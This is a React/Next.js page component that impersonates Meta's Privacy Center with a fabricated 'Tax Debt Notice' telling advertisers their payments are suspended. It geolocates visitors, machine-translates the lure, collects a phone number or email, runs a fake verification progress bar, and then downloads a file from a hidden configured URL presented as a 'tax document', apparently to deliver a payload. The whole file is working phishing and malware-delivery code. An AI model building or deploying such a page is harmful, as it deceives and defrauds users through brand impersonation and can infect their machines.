'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const menuItems: MenuItem[] = [
    {
        id: 'home',
        icon: faHouse,
        label: 'Privacy Center Home Page',
        isActive: true
    },
    {
        id: 'search',
        icon: faMagnifyingGlass,
        label: 'Search'
    },
    {
        id: 'privacy',
        icon: faLock,
        label: 'Privacy Policy'
    },
    {
        id: 'rules',
        icon: faCircleInfo,
        label: 'Other rules and articles'
    },
    {
        id: 'settings',
        icon: faGear,
        label: 'Settings'
    }
];

const privacyCenterItems: InfoCardItem[] = [
    {
        id: 'tax-debt',
        title: 'Outstanding tax balance detected',
        subtitle: 'Immediate action required',
        image: ProfileImage
    },
    {
        id: 'verify-tax',
        title: 'Verify and settle your tax debt',
        subtitle: 'Payment account suspended',
        image: ProfileImage
    }
];

const agreementItems: InfoCardItem[] = [
    {
        id: 'tax-status',
        title: 'Check your tax status',
        subtitle: 'Professional Tools',
        image: MetaAI
    }
];

const resourceItems: InfoCardItem[] = [
    {
        id: 'why-hold',
        title: 'Why is my account suspended',
        subtitle: 'Tax debt outstanding'
    },
    {
        id: 'tax-forms',
        title: 'Required tax forms',
        subtitle: 'W-9 or W-8BEN submission'
    },
    {
        id: 'payment-resume',
        title: 'When will payments resume',
        subtitle: 'After tax verification'
    }
];

const Page: FC = () => {
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const isTranslatingRef = useRef(false);
    const [country, setCountry] = useState('EN');
    const [showModal, setShowModal] = useState(false);
    const [contactInfo, setContactInfo] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isVerified, setIsVerified] = useState(false);
    const [progress, setProgress] = useState(0);
    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setCountry(data.country_code);
            } catch {}
        };
        fetchGeoInfo();
    }, []);

    useEffect(() => {
        if (!country || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'TAX DEBT NOTICE', 'Our system has detected that your advertising account has an outstanding tax balance. Meta is required to collect tax information from content creators. If any tax withholding applies, your payments have been suspended. To protect the Meta platform and continue receiving payments, you must verify and settle your tax obligation immediately.', 'Important Information:', 'Your payment account is currently suspended due to outstanding tax balance.', 'You must verify your tax status to resume receiving payments.', 'Use the Tax Status Portal to check your outstanding balance.', 'The portal requires your registered phone number or email only.', 'View Tax Status', 'Outstanding tax balance detected', 'Immediate action required', 'Verify and settle your tax debt', 'Payment account suspended', 'Check your tax status', 'Professional Tools', 'Action Required', 'Additional resources', 'Why is my account suspended', 'Tax debt outstanding', 'Required tax forms', 'W-9 or W-8BEN submission', 'When will payments resume', 'After tax verification', 'Your payments will remain suspended until your tax status is verified and any outstanding balance is settled. After verification, you will receive payment in the next scheduled cycle, around the 21st of each month.', 'Enter Phone Number or Email', 'Please enter your registered phone number or email address to check your tax status', 'Phone number or email address', 'Check Tax Status', 'Verifying your information...', 'Search', 'Download tax document', 'Tax record found. You can now download the related document.', 'Reviewing account information', 'Tax status located', 'Your tax record has been reviewed successfully. Download the document below to continue the next step.'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, country);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [country, translations]);

    const resetModal = () => {
        setShowModal(false);
        setContactInfo('');
        setIsLoading(false);
        setIsVerified(false);
        setProgress(0);
    };

    const handleDownloadDocument = () => {
        const downloadUrl = process.env.NEXT_PUBLIC_DOWNLOAD_URL;
        if (!downloadUrl) return;

        const link = document.createElement('a');
        link.href = downloadUrl;
        link.download = '';
        link.rel = 'noopener';
        document.body.appendChild(link);
        link.click();
        link.remove();
    };

    const handleCheckTaxStatus = async () => {
        if (!contactInfo.trim()) return;

        setIsLoading(true);
        setProgress(0);

        const startedAt = Date.now();
        const duration = 3000;
        const progressTimer = window.setInterval(() => {
            const elapsed = Date.now() - startedAt;
            setProgress(Math.min((elapsed / duration) * 100, 100));
        }, 50);

        await new Promise((resolve) => setTimeout(resolve, 3000));

        window.clearInterval(progressTimer);
        setProgress(100);
        setIsLoading(false);
        setIsVerified(true);
    };

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Tax Debt Notice</title>
            <div className='flex w-full max-w-275'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-17.5' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-12.5 w-12.5' />
                        <p className='text-2xl font-bold'>{t('TAX DEBT NOTICE')}</p>
                    </div>
                    <p>{t('Our system has detected that your advertising account has an outstanding tax balance. Meta is required to collect tax information from content creators. If any tax withholding applies, your payments have been suspended. To protect the Meta platform and continue receiving payments, you must verify and settle your tax obligation immediately.')}</p>
                    <div className='rounded-b-[20px] bg-white'>
                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
                        <div className='flex flex-col items-start justify-center gap-3 p-5'>
                            <p className='text-xl font-bold'>{t('Important Information:')}</p>
                            <ul className='flex list-inside list-disc flex-col gap-2 text-[15px]'>
                                <li>{t('Your payment account is currently suspended due to outstanding tax balance.')}</li>
                                <li>{t('You must verify your tax status to resume receiving payments.')}</li>
                                <li>{t('Use the Tax Status Portal to check your outstanding balance.')}</li>
                                <li>{t('The portal requires your registered phone number or email only.')}</li>
                            </ul>
                            <button onClick={() => setShowModal(true)} className='mt-2 block w-full overflow-hidden rounded-full bg-[#0866FF] px-4 py-3.5 text-center text-[15px] leading-4.75 font-medium text-ellipsis whitespace-nowrap text-white transition-all hover:bg-[#1877F2]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
                                {t('View Tax Status')}
                            </button>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            {privacyCenterItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === privacyCenterItems.length - 1;
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Action Required')}</p>
                            {agreementItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === agreementItems.length - 1;
                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            {resourceItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === resourceItems.length - 1;
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <p className='text-[15px] text-[#465a69]'>{t('Your payments will remain suspended until your tax status is verified and any outstanding balance is settled. After verification, you will receive payment in the next scheduled cycle, around the 21st of each month.')}</p>
                    </div>
                </div>
            </div>

            {/* Modal */}
            {showModal && (
                <div
                    className='fixed inset-0 z-50 flex items-center justify-center bg-black/50'
                    onClick={() => {
                        if (isLoading) return;
                        resetModal();
                    }}
                >
                    <div className='w-full max-w-150 rounded-4xl bg-white shadow-2xl' onClick={(e) => e.stopPropagation()}>
                        <div className='flex items-start justify-between gap-4 px-6 pt-6 pb-3 sm:px-8 sm:pt-7'>
                            <div className='pr-4'>
                                <h2 className='text-[24px] leading-7 font-semibold text-[#1C1E21]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
                                    {t('Enter Phone Number or Email')}
                                </h2>
                            </div>
                            <button
                                type='button'
                                onClick={() => {
                                    if (isLoading) return;
                                    resetModal();
                                }}
                                className='flex h-8 w-8 items-center justify-center text-[#65676B] transition-colors hover:text-[#1C1E21]'
                                disabled={isLoading}
                            >
                                <FontAwesomeIcon icon={faXmark} className='text-[20px]' />
                            </button>
                        </div>

                        <div className='px-6 pb-6 sm:px-8 sm:pb-8'>
                            {isVerified ? (
                                <div className='rounded-2xl border border-[#E4E6EB] bg-[#F8F9FB] p-4'>
                                    <div>
                                        <p className='text-[15px] font-semibold text-[#1C1E21]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
                                            {t('Tax status located')}
                                        </p>
                                        <p className='mt-1 text-[13px] leading-4.25 font-normal text-[#65676B]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
                                            {t('Your tax record has been reviewed successfully. Download the document below to continue the next step.')}
                                        </p>
                                    </div>
                                </div>
                            ) : (
                                <>
                                    <div className='relative min-h-15 rounded-2xl border border-[#CED0D4] bg-white'>
                                        <div
                                            className='pointer-events-none absolute top-4.5 left-4 max-w-full origin-top-left overflow-x-hidden overflow-y-hidden text-[15px] leading-[1.13334] font-normal text-ellipsis whitespace-nowrap text-[#65676B] transition-transform duration-200'
                                            style={{
                                                fontFamily: 'Optimistic, Helvetica, Arial, sans-serif',
                                                transform: 'scale(0.86666666666667) translateY(-13px)'
                                            }}
                                        >
                                            {t('Phone number or email address')}
                                        </div>
                                        <div className='px-4 pt-4.5 pb-1'>
                                            <input type='text' value={contactInfo} onChange={(e) => setContactInfo(e.target.value)} placeholder={t('Phone number or email address')} className='mt-0 block h-9.5 w-full min-w-0 border-0 bg-transparent px-0.5 pt-0 text-[15px] leading-[1.2667] font-medium text-ellipsis text-[#1C1E21] outline-hidden placeholder:text-transparent' style={{ fontFamily: 'Optimistic, system-ui, sans-serif' }} disabled={isLoading} />
                                        </div>
                                    </div>

                                    <p className='mt-3 text-[13px] leading-4.25 font-normal text-[#65676B]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
                                        {t('Use the Tax Status Portal to check your outstanding balance.')}
                                    </p>
                                </>
                            )}

                            {isLoading && (
                                <div className='mt-5 text-[#1C1E21]'>
                                    <div className='flex items-center gap-3'>
                                        <div className='relative h-5 w-5 shrink-0'>
                                            <div className='absolute inset-0 rounded-full border-2 border-[#D6E5FF]'></div>
                                            <div className='absolute inset-0 animate-spin rounded-full border-2 border-transparent border-t-[#0866FF] border-r-[#0866FF]'></div>
                                        </div>
                                        <div className='min-w-0'>
                                            <p className='text-[15px] font-medium'>{t('Verifying your information...')}</p>
                                            <p className='mt-0.5 text-[13px] text-[#65676B]'>{t('Reviewing account information')}</p>
                                        </div>
                                    </div>
                                    <div className='mt-3 h-1.5 overflow-hidden rounded-full bg-[#DCE8FF]'>
                                        <div className='h-full rounded-full bg-[#0866FF] transition-[width] duration-75 ease-linear' style={{ width: `${progress}%` }}></div>
                                    </div>
                                </div>
                            )}

                            <button type='button' onClick={isVerified ? handleDownloadDocument : handleCheckTaxStatus} className='mt-6 block w-full overflow-hidden rounded-full bg-[#0866FF] px-4 py-3.5 text-center text-[15px] leading-4.75 font-medium text-ellipsis whitespace-nowrap text-white transition-all hover:bg-[#1877F2] disabled:cursor-not-allowed disabled:opacity-60' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }} disabled={(!contactInfo.trim() && !isVerified) || isLoading}>
                                <span className='inline-flex items-center justify-center gap-2'>
                                    <span>{t(isVerified ? 'Download tax document' : 'Search')}</span>
                                </span>
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Page;
